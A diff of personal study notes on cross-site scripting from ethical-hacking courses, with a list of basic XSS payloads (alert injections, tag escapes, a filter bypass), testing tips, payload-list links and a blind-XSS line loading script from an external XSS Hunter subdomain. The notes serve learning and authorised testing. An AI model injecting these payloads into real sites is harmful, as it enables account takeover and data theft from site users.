@@ -1,6 +1,9 @@
 XSS
 ----
 
+Lessons on XSS
+--------------
+
 from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
 * "XSS - Introduction" - https://academy.tcm-sec.com/courses/1152300/lectures/47778441
 - XSS makes use of JavaScript to run malicious actions in a target's web browser
@@ -11,54 +14,62 @@ from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete 
 * "XSS - Stored Lab" - https://academy.tcm-sec.com/courses/1152300/lectures/47778529
 * "XSS - Challenge Walkthrough" - https://academy.tcm-sec.com/courses/1152300/lectures/47778530
 
+---------------------------------------------------
+Some Basic XSS Payloads:
 
-
-
-----------------------------------------------------
-https://xsshunter.com/
-
-XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.
-
-Upon signing up you will create a special xss.ht short domain such as yoursubdomain.xss.ht which identifies your XSS vulnerabilities and hosts your payload. You then use this subdomain in your XSS testing, using injection attempts such as "><script src=//yoursubdomain.xss.ht></script>. XSS Hunter will automatically serve up XSS probes and collect the resulting information when they fire.
-
-[hat tip: TryHackMe]
-----------------------------------------------------
-XSS Payloads:
-
-basic
+* basic
 <script>alert('XSS');</script>
 
-escape insert tab - ">
+* escape insert tab - ">
 "><script>alert('XSS');</script>
 
-escape text area - </textarea>
+* escape text area - </textarea>
 </textarea><script>alert('XSS');</script>
 
-escape JavaScript command - '; ____ //
+* escape JavaScript command - '; ____ //
 ';alert('XSS');//
 
-bypassing filter that filters out the word script - sscriptcript
+* bypassing filter that filters out the word script - sscriptcript
 <sscriptcript>alert('XSS');</sscriptcript>
 
-escape IMG tag - onload=
+* escape IMG tag - onload=
 /NAME_OF_FOLDER/NAME_OF_FILE.jpg" onload="alert('XSS');
 
 [hat tip: TryHackMe - https://tryhackme.com/room/xssgi]
 ------------------------------------------------------
-In order to prevent the website from running all the HTML code (found in the source code) that follows our XSS script injection, insert the "comment tag" at the end of the XSS injection:
+
+Sites with more XSS payloads:
+* https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+* https://github.com/payloadbox/xss-payload-list
+* https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt
+* http://www.xss-payloads.com/ [hat tip: TryHackMe]
+* https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
+* https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-scripting-xss
+
+
+------------------------------------------------------
+Tips on XSS
+------------
+* In order to prevent the website from running all the HTML code (found in the source code) that follows our XSS script injection, insert the "comment tag" at the end of the XSS injection:
 <--
 [hat tip: Jonathan Erez]
------------------------------------------------------
-Tips:
-1) Make sure to for XSS injection in each input box - sometimes one wasn't sanitized even though the others were
-2) Make sure to try XSS injection in URL; sometimes the input was only sanitized in the input form boxes and not in the URL; especially for inputs that are drop down menus and you can only manipulate things in the URL
+
+*  Make sure to try XSS injection in each input box - sometimes one wasn't sanitized even though the others were
+*  Make sure to try XSS injection in URL input box; sometimes the input was only sanitized in the input form boxes and not in the URL; especially for inputs that are drop down menus and you can only manipulate things in the URL
 [hat tip: ThriveDX]
+
 -----------------------------------------------------
-XSS Payloads
-http://www.xss-payloads.com/
+XSS Tools
+---------
+
+* XSS Hunter
+https://xsshunter.com/
+XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.
+Upon signing up you will create a special xss.ht short domain such as yoursubdomain.xss.ht which identifies your XSS vulnerabilities and hosts your payload. You then use this subdomain in your XSS testing, using injection attempts such as "><script src=//yoursubdomain.xss.ht></script>. XSS Hunter will automatically serve up XSS probes and collect the resulting information when they fire.
 [hat tip: TryHackMe]
------------------------------------------------------
-XSS Automation Tool
+
+
+* XSS Automation Tool
 https://github.com/EmperialX/XSS-Automation-Tool
 "XSS automation tool helps hackers identify and exploit cross-site scripting vulnerabilities in web apps. Tests for reflected and persistent XSS. Customize request headers, cookies, proxies, and auth. Find and exploit vulnerabilities with our XSS automation tool."
 [hat tip: Eli on Cyber Together 2 (WhatsApp)]
